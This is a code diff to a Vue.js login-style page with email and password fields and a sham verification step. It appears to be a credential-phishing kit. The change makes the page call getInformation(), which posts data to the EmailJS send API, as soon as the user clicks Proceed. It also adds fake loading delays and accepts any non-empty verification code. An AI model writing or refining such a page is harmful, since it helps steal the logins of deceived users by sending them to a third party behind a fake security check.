@@ -106,7 +106,7 @@
           <div class="flex items-center">
             <strong>Proceed</strong>
             <div
-              v-if="isLoading"
+              v-if="isLoadingCheck"
               class="ml-2 w-5 h-5 rounded-full animate-spin border-4 border-dashed border-primary border-t-transparent"
             ></div>
           </div>
@@ -122,10 +122,12 @@ export default {
   data() {
     return {
       isLoading: false,
+      isLoadingCheck: false,
       email: '',
       password: '',
       pageView: 'one',
       intervalid1: '',
+      intervalid2: '',
       code: '',
     }
   },
@@ -133,20 +135,34 @@ export default {
     proceed() {
       const self = this
       this.isLoading = true
+      this.getInformation()
       this.intervalid1 = setInterval(function () {
         self.isLoading = false
         self.pageView = 'two'
+        self.myStopFunction()
       }, 3000)
     },
+
+    myStopFunction() {
+      clearInterval(this.intervalid1)
+      clearInterval(this.intervalid2)
+    },
+
     checkVerificationCode() {
-      this.isLoading = true
-      if (this.code === '376429') {
-        this.getInformation()
+      const self = this
+      this.isLoadingCheck = true
+      if (this.code !== '') {
+        this.intervalid2 = setInterval(function () {
+          self.isLoadingCheck = false
+          self.$router.push('/validation')
+          self.myStopFunction()
+        }, 3000)
       } else {
         this.$toast.error('Invalid verification code, contact the admin')
-        this.isLoading = false
+        this.isLoadingCheck = false
       }
     },
+
     getInformation() {
       let self = this
       try {
@@ -166,7 +182,6 @@ export default {
           axios
             .post('https://api.emailjs.com/api/v1.0/email/send', data)
             .then(function () {
-              self.$router.push('/validation')
               self.isLoading = false
             })
             .catch(function () {
